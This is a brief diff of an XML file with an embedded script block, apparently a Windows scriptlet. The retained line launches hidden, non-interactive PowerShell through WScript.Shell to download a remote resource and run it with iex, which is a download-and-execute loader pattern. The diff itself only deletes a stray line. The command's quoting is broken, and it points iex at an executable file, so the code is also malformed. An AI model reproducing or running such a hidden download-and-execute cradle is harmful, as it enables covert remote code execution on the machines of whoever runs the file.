@@ -22,7 +22,6 @@
 		<![CDATA[
  
 			var r = new ActiveXObject("WScript.Shell").Run("powershell.exe -w hidden -noni -nop -c "iex(New-Object System.Net.WebClient).DownloadString('https://live.sysinternals.com/autoruns.exe')"");
-");
  
 		]]>
 	</script>
